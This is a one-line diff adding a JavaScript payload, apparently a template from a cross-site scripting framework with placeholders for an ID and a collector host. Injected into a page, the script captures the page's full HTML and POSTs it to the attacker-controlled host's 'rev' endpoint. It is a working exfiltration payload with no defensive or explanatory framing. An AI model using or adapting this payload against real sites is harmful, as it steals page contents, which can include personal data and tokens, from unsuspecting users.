@@ -1,0 +1,1 @@
+function help(){xssinfo={};xssinfo["id"]="<-|ID|->";try{xssinfo["value"]=document.documentElement.outerHTML}catch(e){xssinfo["value"]=""}var ajax=new XMLHttpRequest();ajax.open("POST","<-|HOST|->rev");ajax.setRequestHeader("Content-type","text/plain");ajax.send(JSON.stringify(xssinfo));ajax.onreadystatechange=function(){if(ajax.readyState==4&&ajax.status==200){}}}help();
